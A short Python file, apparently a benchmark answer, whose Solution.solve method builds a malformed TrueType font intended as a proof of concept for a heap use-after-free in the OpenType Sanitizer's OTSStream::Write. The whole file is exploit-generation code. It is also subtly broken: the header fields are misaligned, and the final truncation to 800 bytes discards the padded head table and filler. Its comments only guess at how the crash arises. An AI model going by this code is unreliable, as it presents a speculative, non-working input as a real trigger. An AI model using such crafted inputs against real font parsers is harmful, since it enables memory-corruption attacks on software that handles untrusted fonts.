import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed TTF to trigger OTSStream::Write heap UAF
        # Based on typical OTS parsing issues in table processing
        poc = b'true'
        poc += struct.pack('>H', 1)  # version
        poc += b'\x00' * 6  # dummy sfnt version padding
        poc += struct.pack('>H', 1)  # numTables = 1
        poc += struct.pack('>H', 1024)  # searchRange
        poc += struct.pack('>H', 3)  # entrySelector
        poc += struct.pack('>H', 16)  # rangeShift

        # Table directory: head table, but malformed
        poc += b'head\x00\x00\x00\x00'  # tag
        poc += struct.pack('>I', 0x1000)  # checksum
        poc += struct.pack('>I', 0x2000)  # offset
        poc += struct.pack('>I', 54)  # length

        # Padding to table offset
        poc += b'\x00' * (0x2000 - len(poc))

        # Malformed head table to cause UAF in Write
        poc += struct.pack('>I', 0x00010000)  # table version
        poc += struct.pack('>I', 0x00010000)  # fontRevision
        poc += struct.pack('>I', 0x00000000)  # checkSumAdjustment
        poc += struct.pack('>I', 0x5F0F3CF5)  # magicNumber
        poc += b'\x00' * 2  # flags
        poc += struct.pack('>H', 0)  # unitsPerEm low
        poc += struct.pack('>H', 1024)  # unitsPerEm high? malformed
        # created/unmodified dates malformed to trigger stream issues
        poc += struct.pack('>Q', 0) * 2
        # Rest of head table incomplete
        poc += b'\x00' * (54 - 36)

        # Add extra data to reach approx 800 bytes and trigger write after free
        poc += b'A' * (800 - len(poc))
        return poc[:800]
